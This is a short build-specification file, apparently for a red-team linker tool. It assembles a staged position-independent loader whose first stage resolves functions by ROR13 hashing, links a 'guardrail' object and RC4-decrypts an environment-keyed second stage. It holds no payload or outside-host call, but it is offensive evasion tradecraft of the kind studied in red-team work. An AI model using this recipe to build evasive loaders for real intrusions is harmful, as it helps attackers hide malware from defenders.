#
# Stage 1: our bootstrap PIC code to use an environment-derived key to decrypt our stage 2.
#
x86:
	# load the stage 1 COFF onto the stack
	load "bin/stage1.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution
		dfr "_resolve" "ror13"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "lib/libTCG/libtcg.x86.zip"

		# load our guardrail COFF
		load "bin/guardrail.x86.o"
			make object
			export
			link "coff_gr"

		# process the .spec file for stage 2 and put the result onto the stack
		run "stage2.spec"
			# prepend the Adler32 sum to this data
			prepsum

			# rc4 encrypt our data using CLI/API-passed ENVKEY
			rc4 $ENVKEY

			# prepend the length to our (encrypted) data
			preplen

			# link to coff_s2
			link "coff_s2"

		export

x64:
	load "bin/stage1.x64.o"
		make pic +gofirst

		dfr "resolve" "ror13"
		mergelib "lib/libTCG/libtcg.x64.zip"

		run "stage2.spec"
			prepsum
			rc4 $ENVKEY
			preplen
			link "coff_s2"

		load "bin/guardrail.x64.o"
			make object
			export
			link "coff_gr"

		export
